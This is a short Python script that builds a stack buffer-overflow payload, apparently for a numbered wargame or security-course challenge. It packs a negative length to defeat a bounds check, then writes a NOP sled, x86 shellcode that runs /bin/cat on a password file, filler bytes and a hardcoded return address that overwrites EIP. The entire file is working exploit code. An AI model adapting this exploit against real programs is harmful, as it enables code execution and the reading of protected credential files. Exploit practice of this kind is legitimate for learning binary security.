import struct

# custom shellcode from challenge 08 (catpw.s)
shellcode = b'j\x0bX1\xd2RhsswdhA.pa\x8dL$\x01Rh/cath/bin\x89\xe3RQS\x89\xe1\xcd\x80'
# add padding to the end of the shellcode so we dont overwrite it
# (we push to the stack in the shellcode)
shellcode += b'\xcc' * 16

s = b''
# -1 makes loop ignore bounds, so it copies until a null is found
s += struct.pack("<i", -1)
s += b'/' + shellcode.rjust(128, b'\x90')

s += b'AAAABBBBCCCCDDDDEEEEFFFFGGGG'

# eip
s += struct.pack("<I", 0xbffffaf2)

# with open('data', 'wb') as f:
#     f.write(s)
print(s)